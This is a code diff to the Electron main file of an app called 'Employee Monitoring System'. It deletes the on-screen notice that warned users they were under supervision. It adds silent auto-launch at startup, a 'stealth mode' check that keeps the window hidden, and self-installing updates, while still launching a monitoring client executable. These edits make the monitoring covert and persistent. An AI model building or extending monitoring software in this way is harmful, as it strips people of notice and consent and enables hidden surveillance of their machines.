@@ -1,22 +1,35 @@
-// Modules to control application life and create native browser window
-const {app, BrowserWindow, shell} = require('electron')
+const {app, BrowserWindow} = require('electron')
 const ChildProcess = require('child_process');
-const {showNotification} = require('./components')
-
+const AutoLaunch = require('auto-launch');
 const path = require('path')
 const log = require('electron-log');
 const {autoUpdater} = require("electron-updater");
+const { Notification } = require('electron')
+var autoLauncher = new AutoLaunch({
+    name: "Employee Monitoring System"
+});
+
+autoLauncher.isEnabled().then(function(isEnabled) {
+	if (isEnabled) {
+		return;
+	}
+	autoLauncher.enable();
+}).catch(function (err) {
+	throw err;
+});
+
+function showNotification (title, body) {
+	const notification = {
+		title: title,
+		body: body,
+	};
+	new Notification(notification).show();
+}
 
 var processes = [];
 
-Object.defineProperty(app, 'isPackaged', {
-	get() {
-		return true;
-	}
-});
-
+// require('electron-reload')(__dirname);
 autoUpdater.logger = log;
-autoUpdater.autoDownload = true;
 autoUpdater.logger.transports.file.level = 'info';
 log.info('App starting...');
 
@@ -37,9 +50,7 @@ function createWindow () {
 	mainWindow.loadFile('index.html');
 }
 
-
 function start_client_app() {
-	showNotification("Client Application Started", "Monitoring your system has started. You will be under supervision.");
 	var newProcess = ChildProcess.exec(`"${__dirname}\\engine\\client_app\\client_app.exe" "${app.getPath("userData")}"`, (err, sout, ster) => {
 		console.log(err, sout, ster)
 	});
@@ -50,24 +61,37 @@ function start_client_app() {
 	});
 }
 
-// This method will be called when Electron has finished
-// initialization and is ready to create browser windows.
-// Some APIs can only be used after this event occurs.
+function check_stealth_mode() {
+	var done = false;
+	return new Promise((resolve, reject) => {
+		ChildProcess.exec(`"${__dirname}\\engine\\doer\\doer.exe" "${app.getPath("userData")}" check_stealth_mode`, function(err, data){
+			if (data == 1)
+				done = true;
+			resolve(done);
+		});
+	});
+}
 
-app.whenReady().then(() => {
-	createWindow();
-	start_client_app();
-	console.log("Feed url: ", autoUpdater.getFeedURL())
-	autoUpdater.checkForUpdates();
-	app.on('activate', function () {
-		// On macOS it's common to re-create a window in the app when the
-		// dock icon is clicked and there are no other windows open.
-		if (BrowserWindow.getAllWindows().length === 0) createWindow()
+let isSingleInstance = app.requestSingleInstanceLock()
+if (!isSingleInstance) {
+	app.quit()
+} else {
+	app.whenReady().then(async () => {
+		if (isSingleInstance) {
+			autoUpdater.checkForUpdatesAndNotify();
+			start_client_app();
+			const is_stealth_mode = await check_stealth_mode();
+			if (!is_stealth_mode){
+				createWindow();
+			}
+			app.on('activate', function () {
+				if (BrowserWindow.getAllWindows().length === 0) createWindow()
+			});	
+		}
 	})
-})
+}
 
 autoUpdater.on('checking-for-update', () => {
-	console.log('Checking for update...');
 });
 autoUpdater.on('update-not-available', () => {
 });
@@ -81,8 +105,8 @@ autoUpdater.on('update-downloaded', () => {
 	autoUpdater.quitAndInstall(true, true);
 });
 
+// Quit when all windows are closed.
 app.on('window-all-closed', function () {
-	console.log("Application Closed");
 	processes.forEach(function(proc) {
 		proc.kill();
 	});
